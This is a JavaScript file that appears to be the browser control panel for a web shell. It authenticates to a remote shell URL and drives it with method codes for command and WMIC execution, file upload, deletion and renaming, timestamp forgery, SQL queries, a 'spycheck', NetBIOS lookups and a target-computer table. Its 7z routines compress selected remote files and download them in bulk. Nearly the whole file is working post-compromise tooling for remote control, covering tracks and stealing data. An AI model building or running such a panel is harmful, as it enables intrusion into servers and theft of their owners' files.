$(document).ready(function () {
    $('#btnLogin').click();
    //getLocation(function () { $("#mdlspy").click(); });
    //document.getElementById("chkModules").click();
    //spyCheckTimer();

    //$('#stickyDirCommand')
    //    .sticky({
    //        context: '#stickyDirContext'
    //    });


    //$('#tbMain')
    //    .sticky({
    //        context: '#log'
    //    });

    $('.ui.dropdown').dropdown();
    $('#cmbIP').dropdown({
        fullTextSearch: 'exact',
        match: 'text',
        onLabelSelect: function (selectedLabels) {
            var selectedValue = $(selectedLabels).attr('data-value');
            if (selectedValue) {
                $('#cmdSelectedLocation').text(selectedValue);
                setAddress(selectedLabels, selectedValue);
            }
        },
        action: function (text, value) {
            console.log(text);
            console.log(value);
            $(this).dropdown("set selected", value);
            $(this).dropdown("refresh");
        }
    });

    $('.menu .item').tab();

    $('#inpCmd').focus();

    $(".ui.toggle.button").state({
    });

    $('#TargetComputerTable').DataTable({
        "order": [[1, 'asc']],
        "paging": false,
        "autoWidth": false,
            "columnDefs": [
            { "orderable": false, "targets": 0 }
        ]
    });

    $(".ui.checkbox").checkbox();
    $('#TargetComputersCheckAll').checkbox({
        onChecked: function () { TargetComputerSelectAllItem(); },
        onUnchecked: function () { TargetComputerDeSelectAllItem(); }
    });

    $('.ui.button').popup();

    LoadStorageSettings();
});

var varNames = {
    password:"p",
    url: "url",
    method: "m",
    command: "cmd",
    btnLogin: "btnLogin",
    lblLocation: "loc",
    explorer: "exadd",
    getSize: "gsize",
    download: "don",
    changeTimeHidden:"timeh",
    changeTimeFile:"tfil",
    changeTimeTarget:"ttar",
    changeTimeTime: "ttim",
    installModuleName: "mname",
    cookieNameUsername:"cookieUsername",
    cookieNamePassword:"cookiePassword"
};

var methodID = { 
    auth : 0,
    command : 1,
    upload : 2,
    uploadbase64 : 3,
    delete : 4,
    download : 5,
    changeTime : 6,
    sqlQuery : 7,
    explorer: 8,
    getsize: 9,
    getlocation: 10,
    rename: 11,
    copy: 12,
    view: 13,
    commandAjax:14,
    downloadTest: 15,
    checkModules: 16,
    installModule: 17,
    uninstallModule: 18,
    cmd7z: 19,
    authAjax: 20,
    getlocationAjax: 21,
    spycheck: 22,
    localExplore: 23,
    multiDelete: 24,
    checkDownloadProgress: 25,
    getIPFromNbt: 26,
    GetLogicDrives: 27,
    NetworkDownloaderCheck: 28,
    NetworkDownloaderLog: 29,
    NetworkDownloaderError: 30,
    NetworkDownloaderDone: 31,
    NetworkDownloaderDir: 32,
    SaveLog: 33,
    downloadDemo: 34,
    downloadPause: 35,
    downloadInfo: 36,
    downloadLoad: 37,
    downloadClose: 38,
    downloadChangeStatusToRequested: 39
};

function copyLoc() {
    copyToClipboard(document.getElementById("loc"));
}

function subm() {
    //var url = getElementValue(varNames.url);
    //var frm = document.getElementsByClassName('form');
    //for (var i = 0; i < frm.length; i++) {
    //    frm.action = url;
    //}
    //var mmm = document.getElementsByClassName('mmm');
    //for (var i = 0; i < mmm.length; i++) {
    //    mmm[i].value = btoa(mmm[i].value);
    //}
}
function reset() {
    document.cookie = "data=;expires=Thu, 01 Jan 1970 00:00:01 GMT;path=/";
    location.href = location.pathname;
}

//function openTab(ev, nm) {
//    var i, tb, tblnk;
//    tb = document.getElementsByClassName("tb");
//    for (i = 0; i < tb.length; i++) {
//        tb[i].style.display = "none";
//    }
//    tblnk = document.getElementsByClassName("tblnk");
//    for (i = 0; i < tblnk.length; i++) {
//        tblnk[i].className = "tblnk";
//    }
//    document.getElementById(nm).style.display = "block";
//    ev.className += " active";

//    $('#tbMain').sticky('refresh');
//}

//function fixLogSize()
//{
//    document.getElementById('log').style.height = "calc(100% - " + document.getElementById('header').offsetHeight + ")";
//}

function loader(sender)
{
    //<span id="loader" class="loader" style="display:none"></span>
    var ldr = document.createElement("span");
    
    ldr.className = "loader";
    ldr.style.top = sender.getBoundingClientRect().top;
    ldr.style.left = sender.getBoundingClientRect().left + sender.offsetWidth + 5;
    document.body.appendChild(ldr);
    return ldr;
}

function print(str, isAppendPrint) {
    if (isAppendPrint || typeof isAppendPrint == 'undefined')
    {
        var log = document.getElementById("log");
        log.innerHTML = document.getElementById("log").innerHTML + str + "<br>";
    }
    else
        document.getElementById("log").innerHTML = str;
}

function logout(sender)
{
    var urlBox = document.getElementById(varNames.url);
    urlBox.value = "";
    eraseCookie(varNames.password);
    eraseCookie(varNames.url);
    urlBox.className = "";
    if (spyCheckTimerHandler)
        clearTimeout(spyCheckTimerHandler);
    $("#mdlspy").removeClass("green");
    $("#mdlspy").removeClass("red");
    $("#mdlspy").removeClass("blue");
    $("#mdlspy").children('.icon').eq(0).attr("class", "large Empty Heart icon");
    $('.mdlItem').each(function () {
        $(this).removeClass("active");
        $(this).removeClass("loading");
    });
    document.getElementById(varNames.lblLocation).innerText = "";
    login(sender);
}

var afterUpload;
function login(sender)
{
    var urlBox = document.getElementById(varNames.url);
    if (urlBox.value.isEmpty())
    {
        urlBox.value = readCookie(varNames.url);
    }
    var UrlP = urlBox.value.split(";");
    var url = UrlP[0];
    var p = UrlP[1];
    urlBox.value = url;
    if (p)
    {
        eraseCookie(varNames.password);
        createCookie(varNames.password, p, 144);
    }
    else
        p = readCookie(varNames.password);

    eraseCookie(varNames.url);
    createCookie(varNames.url, url, 144);

    var data = [
        { name: varNames.method, value: methodID.authAjax },
        { name: varNames.url, value: url }
    ];

    if (spyCheckTimerHandler)
        clearTimeout(spyCheckTimerHandler);
    requestTextResult(data, sender, false, function (res) {
        if (res.startsWith("Error"))
            print(res);
        else {
            var data = JSON.parse(res);
            if (data.auth.toLowerCase() == "true") {

                readCookie(varNames.url);
                document.getElementsByName("adminU")[0].value = readCookie(varNames.cookieNameUsername);
                document.getElementsByName("adminP")[0].value = readCookie(varNames.cookieNamePassword);

                urlBox.className = "login";
                //print("Login successful\r\n");

                document.getElementById(varNames.lblLocation).innerText = b64DecodeUnicode(data.loc);
                $("#mdlspy").click();
                spyCheckTimer();

                //checkModulesFN(b64DecodeUnicode(data.module));
                checkModules(document.getElementById('chkModules'));

                DownloadLoad();
                TardigradeOnLoad();

                if (afterUpload)
                    afterUpload();
                else
                    setAddress(document.getElementById('btnExpror'), "\\\\localhost");

                breadcrumber(url);

            } else {
                urlBox.className = "logout";
                //print("Login failed\r\n");
            }
        }
    });
}

function requestTextResult(data, sender, isPrint, callback, dataIsBinary, isAppendPrint)
{
    var loadingClassName = "loadingM";
    var loadingElement = null;
    if (sender != null) {
        loadingElement = $(sender);
        if ($(sender).prop("tagName") == "INPUT") {
            loadingClassName = "loading";
            loadingElement = loadingElement.parent();
        }
    }

    if (sender == null || !loadingElement.hasClass(loadingClassName)) {
        //for (var i = 0; i < data.length; i++) {
        //    createCookie(data[i].name, data[i].value, 144);
        //}

        var ldr = null;
        //if (sender)
        //    ldr = loader(sender);
        //sender.className = sender.className + " loadingM";
        if (sender != null)
            loadingElement.addClass(loadingClassName);
        var info = {
            data: data,
            onSuccess: function (res, xhr) {
                //if(ldr)
                //    ldr.remove();

                var data = res;
                if (isPrint)
                    print(data, isAppendPrint);
                if (callback)
                    callback(res, xhr);
                //sender.className = sender.className.replace(" loadingM", "");
                if (sender != null)
                    loadingElement.removeClass(loadingClassName);
            },
            dataIsBinary: dataIsBinary
        };

        sendData(info);
    }
    else
        console.log("sender are in loading state");
}

function cmd7za(sender, callback)
{
    if ($("#mdl7z").hasClass("active")) {

        var files = "";
        $(".selectitem.checked").each(function (index) {
            files += "\"" + getCurrentAddress() + "\\" + $(this).siblings(".objRight").eq(1).text() + "\" ";
        });

        var cmd7z = String.format('{0} {1} a "{2}" {3}{4}{5} 2>&1',
            moduleFolder + ModuleFileNameTarget.mdl7z,
            $("#7zclevel").val(),
            $("#7zaddress").val(),
            files,
            ($("#7zvsize").val() == "" ? "" : "-v" + $("#7zvsize").val() + $("#7zvmode").val()),
            $("#7zexclude").val()
        );

        ExecuteCommandWmic(null,
            cmd7z.replace(/"/g, '\\"').replace(/>/g, '^>'),
            function (res) {
                if (callback)
                    callback(res);
            });

        //var data = [
        //    { name: varNames.method, value: methodID.cmd7z },
        //    { name: "7zclevel", value: $("#7zclevel").val() },
        //    { name: "7zaddress", value: $("#7zaddress").val() },
        //    { name: "7zvsize", value: $("#7zvsize").val() },
        //    { name: "7zvmode", value: $("#7zvmode").val() },
        //    { name: "7zexclude", value: $("#7zexclude").val() },
        //    { name: "7zfiles", value: files }
        //];

        //requestTextResult(data, sender, true,
        //    function (res) {
        //        if (callback)
        //            callback(res);
        //        else
        //            document.getElementById('btnExpror').click();
        //    });
    }
    else
        print("7z module is not installed");
}

function cmd7zdl(sender)
{
    $(sender).addClass("loadingM");

    var fName7z = getCurrentAddress().replace("\\\\", "").replace(/\\/g, "_").replace(/:/g, "_");
    var files = $(".selectitem.checked");
    if (files.length == 1)
        fName7z += "_" + files.eq(0).siblings(".objRight").eq(1).text();
    else
        fName7z += "_[" + files.length + "]";


    var dt = new Date();
    var FileName7z = fName7z + "_" +
        dt.getFullYear() + "-" +
        (dt.getMonth() + 1) + "-" +
        dt.getDate() + "-" +
        dt.getHours() + "-" +
        dt.getMinutes() + "-" +
        dt.getSeconds() + ".7z";
    var filename = moduleFolder + FileName7z;
    console.log(filename);
    $("#7zaddress").val(filename);
    cmd7za(document.getElementById("cmd7z"),
    function (res) {
        print(res);
        $(sender).removeClass("loadingM");
        var cmdFilesList = "dir /b \"" + moduleFolder + "\" 2>&1";
        ExecuteCommand(null, cmdFilesList, function (res) {
            if (!res.startsWith("Error")) {
                var filesTemp = res.split('\r\n');
                var ZipedFiles = [];
                for (var l = 0; l < filesTemp.length; l++) {
                    if (filesTemp[l].startsWith(FileName7z))
                        ZipedFiles.push(filesTemp[l]);
                }
                var tempFileList = ZipedFiles.slice();
                print("7z files : " + tempFileList);
                cmddlListDownload(moduleFolder, tempFileList, function () {
                    print("Download (" + ZipedFiles.length + ') files is Completed');
                }, true);
            } else {
                print(res);
            }
        });
        //downloadManager(filename, sender, true, true, true );
    });
    //$("#7zaddress").val("");
}

function cmddl(sender)
{
    $(sender).addClass("loadingM");
    var currentAddress = getCurrentAddress() + "\\";
    var list = [];
    $(".selectitem.checked").each(function (index) {
        list.push($(this).siblings(".objRight").eq(1).text());
        //downloadManager(getCurrentAddress() + "\\" + $(this).siblings(".objRight").eq(1).text(), this, true, false, true );
    });
    cmddlListDownload(currentAddress, list);

    $(sender).removeClass("loadingM");
}

function cmddelete(sender) {
    //var files = $(".selectitem.checked");
    //if (confirm("Are you sure you want to delete this '" + files.length + "' files?") == true) {
    //    var filesstr = "";
    //    var currentAddress = getCurrentAddress();
    //    files.each(function (index) {
    //        if (!filesstr.isEmpty())
    //            filesstr += "|";
    //        filesstr += b64EncodeUnicode(currentAddress + "\\" + $(this).siblings(".objRight").eq(1).text());
    //    });
    //    requestTextResult([
    //        { name: varNames.method, value: methodID.multiDelete },
    //        { name: "delete", value: filesstr },
    //    ], sender, true, function (res) {
    //        $('#btnExpror').click();
    //    });
    //}

    var files = $(".selectitem.checked");
    $('#messageDeleteMultiFile').find('[name="message"]').eq(0).text(files.length);
    $('#messageDeleteMultiFile')
        .modal({
            transition: 'horizontal flip',
            onDeny: function () {
            },
            onApprove: function () {
                var filesstr = "";
                var currentAddress = getCurrentAddress();
                files.each(function (index) {
                    if (!filesstr.isEmpty())
                        filesstr += "|";
                    filesstr += b64EncodeUnicode(currentAddress + "\\" + $(this).siblings(".objRight").eq(1).text());
                });
                requestTextResult([
                    { name: varNames.method, value: methodID.multiDelete },
                    { name: "delete", value: filesstr },
                ], sender, true, function (res) {
                    $('#btnExpror').click();
                });
            }
        })
        .modal('show');
}

function changeTime(sender)
{
    var data = [
        { name: varNames.method, value: methodID.changeTime },
        { name: varNames.changeTimeHidden, value: getElementValueByName(varNames.changeTimeHidden) },
        { name: varNames.changeTimeFile, value: getElementValueByName(varNames.changeTimeFile) },
        { name: varNames.changeTimeTarget, value: getElementValueByName(varNames.changeTimeTarget) },
        { name: varNames.changeTimeTime, value: getElementValueByName(varNames.changeTimeTime) }
    ];
    requestTextResult(data, sender, true);
}

//function download(sender)
//{
//    var url = document.getElementById(varNames.url).value;
//    sender.form.action = url;
//    var password = readCookie(varNames.password);
//    document.getElementById("donPass").value = b64EncodeUnicode(password);
//    var don = document.getElementById("donInput");
//    don.value = b64EncodeUnicode(don.value);
//    var method = document.getElementById("donMethod").value = b64EncodeUnicode(methodID.download);
//    sender.form.submit();
//    return false;
//}
//function download2(sender)
//{
//    var data = [
//        { name: varNames.method, value: methodID.download },
//        { name: varNames.download, value: getElementValue(varNames.download) }
//    ];

//    requestTextResult(data, sender, false,
//        function (res, xhr)
//        {
//            if (res.status === 200) {
//                var filename = "";
//                var disposition = xhr.getResponseHeader('Content-Disposition');
//                if (disposition && disposition.indexOf('attachment') !== -1) {
//                    var filenameRegex = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/;
//                    var matches = filenameRegex.exec(disposition);
//                    if (matches != null && matches[1]) filename = matches[1].replace(/['"]/g, '');
//                }
//                var type = xhr.getResponseHeader('Content-Type');

//                var blob = typeof File === 'function'
//                    ? new File([res.response], filename, { type: type })
//                    : new Blob([res.response], { type: type });
//                if (typeof window.navigator.msSaveBlob !== 'undefined') {
//                    // IE workaround for "HTML7007: One or more blob URLs were revoked by closing the blob for which they were created. These URLs will no longer resolve as the data backing the URL has been freed."
//                    window.navigator.msSaveBlob(blob, filename);
//                } else {
//                    var URL = window.URL || window.webkitURL;
//                    var downloadUrl = URL.createObjectURL(blob);

//                    if (filename) {
//                        // use HTML5 a[download] attribute to specify filename
//                        var a = document.createElement("a");
//                        // safari doesn't support this yet
//                        if (typeof a.download === 'undefined') {
//                            window.location = downloadUrl;
//                        } else {
//                            a.href = downloadUrl;
//                            a.download = filename;
//                            document.body.appendChild(a);
//                            a.click();
//                        }
//                    } else {
//                        window.location = downloadUrl;
//                    }

//                    setTimeout(function () { URL.revokeObjectURL(downloadUrl); }, 100); // cleanup
//                }
//            }
//        },
//        true);
//}

function getLocation(callback) {
    var data = [
        { name: varNames.method, value: methodID.getlocationAjax }
    ];
    requestTextResult(data, document.getElementById("loc"), false, function (res) {
        document.getElementById(varNames.lblLocation).innerText = res;
        callback();
    });
}

function loadForm()
{
    var url = readCookie(varNames.url);
    var password = readCookie(varNames.password);
    setElementValue(varNames.url, url);
    if (url && password)
    {
        setElementValue(varNames.password, password);
        login(document.getElementById(varNames.btnLogin));
    }

    setElementValue(varNames.command, readCookie(varNames.command));

}

function grabEnter(event, sender)
{
    var key = event.keyCode | event.which;
    if (key == 13 && event.shiftKey)
    {
        //sender.form.submit();
        //$(sender.form).find('input[type="submit"]').click();
        sender.form.submit();
        $(sender).parent().next().click();
        return false;
    }
    else if (key == 13)
    {
        if (sender.name == "cmd")
            command(sender);
        else {
            //$(sender).parent().next().click();
            $(sender).next().click();
            return false;
        }
        return false;
    }
    return true;
}

function sidebarOpen(id)
{
    $('#' + id)
    .sidebar({
        transition: 'overlay',
        dimPage: false,
        closable: false
    })
        .sidebar("toggle");
}